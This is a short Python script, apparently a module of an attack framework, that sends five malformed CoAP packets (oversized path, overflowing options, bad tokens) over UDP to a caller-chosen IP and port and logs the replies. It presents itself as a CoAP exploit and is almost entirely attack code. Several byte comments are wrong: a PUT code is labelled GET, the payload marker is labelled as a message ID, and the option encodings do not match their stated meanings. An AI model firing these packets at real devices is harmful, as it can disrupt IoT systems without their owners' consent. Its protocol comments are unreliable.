import socket

def run(ip: str, port: int, **kwargs) -> dict:
    """
    Custom CoAP exploit with multiple payload variations targeting known CoAP vulnerabilities.
    Tests: oversized URI, observe option overflow, block2 option overflow, empty token.
    """
    results = []
    
    # Test 1: Oversized URI Path (CVE-like path traversal)
    payload1 = bytes([
        0x40, 0x01, 0x00, 0x00,  # Header: Ver=1, Type=CON, TokenLen=0
        0xFF, 0xFF, 0x00, 0x00,  # Message ID
    ]) + b'/.' * 100  # Oversized path
    
    # Test 2: Observe Option Overflow (set to max uint32)
    payload2 = bytes([
        0x40, 0x01, 0x00, 0x00,
        0xFF, 0xFF, 0x00, 0x00,
        0xB4, 0xFF, 0xFF, 0xFF, 0xFF  # Observe option: 27, len=4, value=max
    ])
    
    # Test 3: Block2 option with invalid size
    payload3 = bytes([
        0x40, 0x01, 0x00, 0x00,
        0xFF, 0xFF, 0x00, 0x00,
        0xE8, 0x0F, 0x00  # Block2 option: num=15, more=1, size=0
    ])
    
    # Test 4: Empty payload with malformed options
    payload4 = bytes([
        0x40, 0x03, 0x00, 0x00,  # Type=CON, Code=GET
        0xFF, 0xFF, 0x00, 0x00,
        0xC1, 0xFF  # Option with len=63 (invalid)
    ])
    
    # Test 5: Long Token value
    payload5 = bytes([
        0x44, 0x01, 0x00, 0x00,  # TokenLen=4
        0xFF, 0xFF, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF  # Token = all 0xFF
    ])
    
    payloads = [
        ("oversized_uri", payload1),
        ("observe_overflow", payload2),
        ("block2_invalid", payload3),
        ("malformed_options", payload4),
        ("long_token", payload5)
    ]
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)
    
    for name, payload in payloads:
        try:
            sock.sendto(payload, (ip, port))
            data, addr = sock.recvfrom(1024)
            results.append(f"{name}: response {data.hex()}")
        except socket.timeout:
            results.append(f"{name}: no response")
        except Exception as e:
            results.append(f"{name}: error {str(e)}")
    
    sock.close()
    return {"results": results, "tested": len(payloads)}
